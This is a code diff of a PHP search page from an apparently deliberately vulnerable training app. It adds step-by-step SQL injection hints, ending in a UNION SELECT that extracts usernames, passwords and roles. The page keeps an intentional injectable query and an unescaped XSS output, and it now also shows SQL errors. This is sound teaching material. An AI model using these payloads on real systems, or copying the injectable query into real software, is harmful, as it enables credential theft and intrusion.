@@ -81,22 +81,36 @@ if (!$conn->connect_error) {
                                 
                                 <?php if ($difficulty == 'beginner'): ?>
                                 <div class="alert alert-info">
-                                    <small><i class="fas fa-lightbulb"></i> Try searching for: John, IT, or SQL injection: <code>' UNION SELECT 1,2,3,4,5-- </code></small>
+                                    <small><i class="fas fa-lightbulb"></i> SQL Injection Steps:</small><br>
+                                    <small>1. Find columns: <code>%' ORDER BY 6#</code> then <code>%' ORDER BY 7#</code></small><br>
+                                    <small>2. Test injection: <code>%' UNION SELECT 1,'test',NULL,NULL,NULL,NULL#</code></small><br>
+                                    <small>3. Get DB info: <code>%' UNION SELECT 1,@@hostname,database(),@@version,NULL,NULL#</code></small><br>
+                                    <small>4. List tables: <code>%' UNION SELECT 1,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#</code></small><br>
+                                    <small>5. Get columns: <code>%' UNION SELECT 1,column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#</code></small><br>
+                                    <small>6. Extract data: <code>%' UNION SELECT 1,username,password,role,NULL,NULL FROM users#</code></small>
                                 </div>
                                 <?php elseif ($difficulty == 'intermediate'): ?>
                                 <div class="alert alert-info">
-                                    <small><i class="fas fa-lightbulb"></i> Try searching for: John, IT, or use SQL injection techniques</small>
+                                    <small><i class="fas fa-lightbulb"></i> Try ORDER BY enumeration, then UNION SELECT techniques</small>
                                 </div>
                                 <?php endif; ?>
                                 <small class="text-muted">Mode: <strong><?php echo ucfirst($difficulty); ?></strong></small>
 
                                 <?php
-                                if (isset($_GET['search'])) {
+                                if (isset($_GET['search']) && !empty(trim($_GET['search']))) {
                                     $search = $_GET['search'];
                                     
                                     // Another SQL injection vulnerability
                                     $query = "SELECT * FROM employees WHERE name LIKE '%$search%' OR department LIKE '%$search%'";
+                                    
+                                    // Debug: Log the query
+                                    error_log("Search Query: " . $query);
+                                    
                                     $result = $conn->query($query);
+                                    
+                                    if ($conn->error) {
+                                        echo "<div class='alert alert-danger mt-3'><i class='fas fa-exclamation-triangle'></i> SQL Error: " . htmlspecialchars($conn->error) . "</div>";
+                                    }
                                     
                                     if ($result && $result->num_rows > 0) {
                                         echo "<h6 class='mt-4'><i class='fas fa-list'></i> Search Results:</h6>";
@@ -108,7 +122,7 @@ if (!$conn->connect_error) {
                                             echo "<tr>";
                                             echo "<td>" . htmlspecialchars($row['name']) . "</td>";
                                             echo "<td>" . htmlspecialchars($row['department']) . "</td>";
-                                            echo "<td>$" . number_format($row['salary'], 2) . "</td>";
+                                            echo "<td>$" . (is_numeric($row['salary']) ? number_format($row['salary'], 2) : htmlspecialchars($row['salary'])) . "</td>";
                                             
                                             // XSS vulnerability - not escaping secret_note
                                             echo "<td>" . $row['secret_note'] . "</td>";
@@ -118,28 +132,16 @@ if (!$conn->connect_error) {
                                     } else {
                                         echo "<div class='alert alert-warning mt-3'><i class='fas fa-exclamation-triangle'></i> No employees found.</div>";
                                     }
+                                } elseif (isset($_GET['search']) && empty(trim($_GET['search']))) {
+                                    echo "<div class='alert alert-info mt-3'><i class='fas fa-info-circle'></i> Please enter a search term to find employees.</div>";
                                 }
                                 ?>
                             </div>
                         </div>
 
-                        <!-- Admin Panel Link -->
+                        <!-- Hidden Admin Panel - Only accessible via direct URL discovery -->
                         <?php if ($_SESSION['role'] == 'admin'): ?>
-                        <div class="card mt-4 border-danger">
-                            <div class="card-header bg-danger text-white">
-                                <h5 class="mb-0"><i class="fas fa-lock"></i> Admin Functions</h5>
-                            </div>
-                            <div class="card-body">
-                                <div class="d-grid gap-2 d-md-flex">
-                                    <a href="admin/secrets.php" class="btn btn-warning">
-                                        <i class="fas fa-eye"></i> View Company Secrets
-                                    </a>
-                                    <a href="admin/vault.php" class="btn btn-danger">
-                                        <i class="fas fa-vault"></i> Access Security Vault
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
+                        <!-- Admin functions are available but hidden. Check employee notes for clues about admin panel locations -->
                         <?php endif; ?>
 
                         <?php if ($difficulty !== 'advanced'): ?>
